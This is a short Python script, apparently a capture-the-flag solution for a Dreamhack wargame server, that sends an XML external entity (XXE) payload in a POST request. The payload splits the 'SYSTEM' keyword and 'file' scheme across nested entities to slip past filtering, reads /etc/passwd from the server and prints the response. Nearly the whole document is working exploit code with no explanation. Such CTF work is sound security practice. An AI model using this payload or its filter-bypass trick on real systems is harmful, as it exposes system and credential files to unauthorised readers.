import requests

port = 21708
test_url = f"http://host3.dreamhack.games:{port}/test"
headers = {"Content-Type": "application/xml"}

xml_data = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY a "S">
  <!ENTITY b "f">
  <!ENTITY xxe &a;YSTEM "&b;ile:///etc/passwd">
]>
<movies>
    <movie>
        <title>test</title>
        <showtime>&xxe;</showtime>
    </movie>
</movies>"""

# Send the XML data in a POST request
response = requests.post(test_url, data=xml_data, headers=headers)

# Print response details
print("Response Code:", response.status_code)
print("Response Body:", response.text)
